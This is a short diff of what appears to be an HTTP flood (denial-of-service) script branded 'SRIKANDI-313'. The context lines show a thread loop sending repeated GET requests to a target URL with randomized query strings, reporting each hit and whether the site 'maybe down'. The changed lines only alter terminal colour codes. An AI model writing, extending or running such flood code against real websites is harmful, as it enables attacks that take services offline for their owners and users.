@@ -102,10 +102,10 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print(f"\033[35m[] \033[94mSRIKANDI-313  \033[33mSent to  \033[97m••>  \033[32m[" +str(url)+ "]\033[0m")
+                print(f"\033[35m[] \033[94mSRIKANDI-313  \033[33mSent to  \033[97m••>  \033[41m[" +str(url)+ "]\033[0m")
                 print(f"\033[38;5;39m[] \033[31mSRIKANDI-313  \033[34mSent to  \033[33m••>  \033[38;5;206m[" +str(url)+ "]\033[0m")
             except requests.exceptions.ConnectionError:
-                print(f"\033[97m[] \033[102mSRIKANDI-313\033[0m  \033[41mConnection-error\033[0m\033[96mWebs maybe down\033[0m")
+                print(f"\033[97m[] \033[102mSRIKANDI-313\033[0m  \033[41mConnection-error\033[0m \033[96m\033[105mWebs maybe down\033[0m")
 
                 pass
             except requests.exceptions.InvalidSchema:
